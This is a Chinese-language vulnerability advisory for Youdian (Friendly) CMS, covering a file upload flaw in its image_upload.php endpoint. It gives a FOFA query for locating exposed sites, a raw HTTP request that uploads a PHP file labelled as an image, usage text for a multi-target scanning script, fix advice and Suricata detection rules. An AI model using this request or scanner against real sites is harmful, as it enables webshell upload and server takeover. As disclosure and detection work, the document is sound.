### 产品简介  
友点CMS是一款高效且灵活的网站管理系统，它为用户提供了简单易用的界面和丰富的功能。无论是企业还是个人，都能通过友点CMS快速搭建出专业且美观的网站。该系统支持多种内容类型和自定义模板，方便用户按需调整。同时，它具备强大的SEO功能，能提升网站在搜索引擎中的排名。友点CMS还支持多语言设置，适应国际化需求。总的来说，友点CMS是网站建设的理想选择，既高效又易用。  

### 漏洞概述  
友点CMS建站系统image_upload.php 接口处存在文件上传漏洞，恶意攻击者可能会利用此漏洞上传恶意文件，从而获取服务器权限。  

### 指纹识别  
fofa: app="友点建站-CMS"  

### 漏洞利用  
```
poc:
POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data;boundary=----WebKitFormBoundarydAPjrmyKewWuf59H
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
  
------WebKitFormBoundarydAPjrmyKewWuf59H
Content-Disposition: form-data; name="files"; filename="ceshi.php"
Content-Type: image/jpg
  
<?php echo md5('666');unlink(__FILE__);?>
------WebKitFormBoundarydAPjrmyKewWuf59H--
```


### 测试和利用脚本  
```
python3 Friendly_CMS_uploadVul.py -h                     
usage: Friendly_CMS_uploadVul.py [-h] [-t] [-r FILE] [-u URL]

### Friendly CMS image_upload.php file upload vulnerability. ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -r FILE, --multi_objective_testing FILE
                        Perform multi-objective testing. e.g:python Friendly_CMS_uploadVul.py -r ./url.txt
  -u URL, --single_objective_testing URL
                        Perform single-objective testing. e.g:python Friendly_CMS_uploadVul.py -u
                        http://xxx.xxx.xxx
```

### 修复建议  
1、请联系厂商进行修复。  
2、如非必要，禁止公网访问该系统。  
3、设置白名单访问。  

### Suricata rules  
```
alert http any any -> any any (msg:"Friendly CMS image_upload.php file upload vulnerability"; flow:established,to_server; flowbits:set,Friendly_CMS_uploadVul; content:"post";http_method;nocase; content:"/Public/ckeditor/plugins/multiimage/dialogs/image_upload.php";http_uri;fast_pattern;nocase; content:"Content-Type: multipart/form-data";http_header;nocase; content:"filename";nocase;http_client_body; content:"<?php";nocase;http_client_body;distance:0; pcre:"/filename.*\.php/Pi"; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E5%8F%8B%E7%82%B9CMS/Youdian_CMD_uploadfile; classtype:web-rce; metadata:created_at 2024-03-22,updated_at 2024-03-22,creater:YUUKI4O4; sid:XX; rev:1;)
alert http any any -> any any (msg:"Friendly CMS image_upload.php file upload vulnerability success"; flow:established,from_server; flowbits:isset,Friendly_CMS_uploadVul; content:"200";http_stat_code; content:"result";http_server_body;nocase; content:"imgurl";distance:0;http_server_body;nocase; pcre:"/\{\"result\"\s*:\s*\"200\".*imgurl.*\.php/Qi"; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E5%8F%8B%E7%82%B9CMS/Youdian_CMD_uploadfile; classtype:web-rce; metadata:created_at 2024-03-22,updated_at 2024-03-22,creater:YUUKI4O4; sid:XX; rev:1;)
```
